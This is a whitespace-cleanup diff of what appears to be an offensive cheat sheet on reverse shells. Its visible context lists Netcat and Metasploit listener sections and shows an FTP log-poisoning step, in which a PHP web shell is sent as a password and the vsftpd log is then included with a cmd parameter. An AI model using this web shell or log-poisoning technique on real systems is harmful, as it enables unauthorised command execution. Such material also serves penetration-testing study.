@@ -63,12 +63,12 @@
     * [<kbd>Listener Metasploit Multi Handler</kbd>](#Linux-Listener-Metasploit-Multi-Handler)
   * [<kbd>Windows Payloads</kbd>](#Windows-Payloads)
     * [<kbd>Listener Netcat</kbd>](#Windows-Listener-Netcat)
-    * [<kbd>Listener Metasploit Multi Handler</kbd>](#Windows-Listener-Metasploit-Multi-Handler)  
- 
+    * [<kbd>Listener Metasploit Multi Handler</kbd>](#Windows-Listener-Metasploit-Multi-Handler)
+
  ---
- 
+
   # <kbd>Bash</kbd>
- 
+
   # <kbd>TCP</kbd>
  
   ```cmd
@@ -327,8 +327,7 @@
   Password: <?php system($_GET['cmd']); ?>
   530 Login incorrect.
   Login failed.
-  ftp> 
-   
+  ftp>
   ```
   
   > /var/log/vsftpd.log&cmd=id
